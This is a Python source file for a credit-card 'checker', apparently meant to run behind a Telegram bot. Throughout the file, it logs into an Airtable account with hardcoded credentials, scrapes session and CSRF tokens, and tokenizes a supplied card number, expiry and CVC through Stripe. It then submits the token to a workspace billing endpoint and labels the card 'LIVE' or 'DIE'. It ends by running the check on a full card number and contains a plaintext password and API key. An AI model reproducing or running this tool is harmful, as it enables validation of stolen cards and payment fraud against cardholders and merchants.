import os
import requests, json
import time
import string
import random
import asyncio
from bs4 import BeautifulSoup
from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from datetime import datetime
import pytz


def fil_data(data):
  use_data = data.split('|')
  cc = use_data[0]
  month = use_data[1]
  year = use_data[2]
  ccv = use_data[3]
  return cc, month, year, ccv


def fileter(string, l, r):
  string = ((string[string.find(l):])[:(string[string.find(l):]).find(r)]).replace(l, '')
  return string

def findstr(string, l, r):
  string = (string[string.find(l)+len(l):])
  string = string[:string.find(r)]
  return string


def stripe_auth(data):
  cc, month, year, ccv = fil_data(data)
  try:
    headers_1 = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Host': 'airtable.com','Referer': 'https','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-site','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'}
    req_1 = requests.get('https://airtable.com/login', headers=headers_1)
    crsf = findstr(req_1.text, 'name="_csrf" value="', '"')
    session = findstr(str(req_1.cookies), '__Host-airtable-session=', ' for')
    session_seg = findstr(str(req_1.cookies), '__Host-airtable-session.sig=', ' for')
    headers_2 = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'airtable.com','Origin': 'https','Referer': 'https','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', 'cookie': f'__Host-airtable-session={session}; __Host-airtable-session.sig={session_seg}'}
    data_2 = {'_csrf': crsf, 'email': 'pfire6576@gmail.com', 'password': 'CC_king20'}
    req_2 = requests.post('https://airtable.com/auth/login/', data=data_2, headers=headers_2)
    session = findstr(str(req_2.cookies), '__Host-airtable-session=', ' for')
    session_seg = findstr(str(req_2.cookies), '__Host-airtable-session.sig=', ' for')
    headers_3 = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Host': 'airtable.com','Referer': 'https','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'document','Sec-Fetch-Mode': 'navigate','Sec-Fetch-Site': 'same-origin','Sec-Fetch-User': '?1','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', 'cookie': f'__Host-airtable-session={session}; __Host-airtable-session.sig={session_seg}'}
    req_3 = requests.get('https://airtable.com/wspEYOZSwg6opeLEC/workspace/billing', headers=headers_3)
    sci = findstr(req_3.text, '"secretSocketId":"', '"')
    client_code = findstr(req_3.text, "release: '", "',")
    get_id = requests.post('https://m.stripe.com/6').json()
    muid = get_id['muid']
    guid = get_id['guid']
    sid = get_id['sid']
    headers_4 = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https','referer': 'https','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'}
    data_4 = {
      'card[name]': 'Baldovino Eugene Durd',
      'card[number]': cc,
      'card[cvc]': ccv,
      'card[exp_month]': month,
      'card[exp_year]': year,
      'card[address_zip]': '10080',
      'email': 'pfire6576@gmail.com',
      'guid': guid,
      'muid': muid,
      'sid': sid,
      'payment_user_agent': 'stripe.js/0049b1d11; stripe-js-v3/0049b1d11',
      'time_on_page': random.randint(1000,5000000),
      'key': 'pk_be40LalrqNyovrhYTMlclChgOLW2H',
      'pasted_fields': 'number'}
    req_4 = requests.post('https://api.stripe.com/v1/tokens', data=data_4, headers=headers_4).json()
    token = req_4['id']
    headers_5 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'airtable.com','Origin': 'https','Referer': 'https','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','x-airtable-inter-service-client': 'webClient','x-airtable-inter-service-client-code-version': client_code,'x-requested-with': 'XMLHttpRequest', 'cookie': f'__Host-airtable-session={session}; __Host-airtable-session.sig={session_seg}'}
    data_5 = {
      "stripeToken":token,
      "source":"workspaceSettings",
      "secretSocketId":sci}
    req_5 = requests.post('https://airtable.com/v0.3/wspEYOZSwg6opeLEC/workspace/updateCard', json=data_5, headers=headers_5)
    if 'cvc_check' in req_5.text:
      result = req_5.json()['stripeCard']['cvc_check']
      if result == 'pass':
        msg = f'''✅ <b>STRIPE AUTH LIVE CCV</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Set up the payment method successfully. [cvc_check: pass]'''
      elif result == 'fail':
        msg = f'''✅ <b>STRIPE AUTH LIVE CCN</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Your card's security code is incorrect. [cvc_check: fail]'''
      elif result == 'unavailable':
        msg = f'''❌ <b>STRIPE AUTH DIE</b> ❌
<b>Card</b>: <code>{data}</code>
<b>Message</b>:  Can't check CVC. [cvc_check: {result}]'''
      else:
        msg = f'''⚠️ <b>STRIPE AUTH WARNING</b> ⚠️
  <b>Card</b>: <code>{data}</code>
  <b>Message</b>: Unknown Response'''
    elif 'error' in req_5.text:
      mes = req_5.json()['error']['message']
      if mes == "Your card's security code is incorrect.":
        msg = f'''✅ <b>STRIPE AUTH LIVE CCN</b> ✅
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Your card's security code is incorrect.'''
      else:
        msg = f'''❌ <b>STRIPE AUTH DIE</b> ❌
<b>Card</b>: <code>{data}</code>
<b>Message</b>: {mes}'''
    else:
      msg = f'''⚠️ <b>STRIPE AUTH WARNING</b> ⚠️
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Error occured.'''
  except:
    msg = f'''⚠️ <b>STRIPE AUTH WARNING</b> ⚠️
<b>Card</b>: <code>{data}</code>
<b>Message</b>: Error occured.'''
  return msg

print(stripe_auth('4154644401238168|01|2025|560'))